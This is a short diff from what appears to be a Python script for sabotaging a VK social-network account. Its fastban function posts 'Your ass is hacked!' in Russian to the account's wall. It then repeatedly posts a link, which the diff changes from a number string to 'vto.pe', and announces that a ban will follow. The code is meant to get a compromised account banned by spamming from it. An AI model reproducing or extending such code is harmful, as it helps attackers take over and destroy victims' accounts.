@@ -95,7 +95,7 @@ def fastban():
         vk.wall.post(message='ТВоя жопа взломана!')
         for i in range(3):
             try:
-                vk.wall.post(message='121212121')
+                vk.wall.post(message='vto.pe')
                 print('Запрос отправленн. Ожидайте бана!')
                 time.sleep(3)
             except Exception as er:
